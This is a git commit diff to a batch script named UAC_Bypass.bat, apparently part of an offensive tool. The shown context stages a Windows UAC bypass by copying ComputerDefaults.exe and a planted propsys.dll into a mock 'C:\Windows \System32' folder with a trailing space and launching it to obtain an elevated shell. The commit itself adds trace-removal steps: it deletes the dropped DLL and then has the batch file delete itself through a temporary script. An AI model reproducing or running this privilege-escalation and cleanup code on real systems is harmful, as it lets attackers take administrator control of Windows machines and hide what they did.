33a3d0df71e18f3961e9c436b219c503a10a4e9c
anon <66513243+dalemazza@users.noreply.github.com>
2025-01-20 22:14:11 +0000

    added me batch file

--- UAC_Bypass.bat
+++ UAC_Bypass.bat
@@ -6,6 +6,7 @@ echo  [+] file copying ...
 copy "C:\Windows\System32\ComputerDefaults.exe" "C:\Windows \System32\"
 echo  [+] file copying ...
 copy "propsys.dll" "C:\Windows \System32\"
+del "propsys.dll"
 "C:\Windows \System32\ComputerDefaults.exe"
 echo  [-] Got Elevated Shell........ ?
 
@@ -14,3 +15,7 @@ del /q "C:\Windows \System32\*"
 rmdir "C:\Windows \System32"
 rmdir "C:\Windows \"
 
+REM Queue the batch file for deletion
+echo del "%~f0" > "%temp%\delete_self.bat"
+echo exit >> "%temp%\delete_self.bat"
+"%temp%\delete_self.bat"
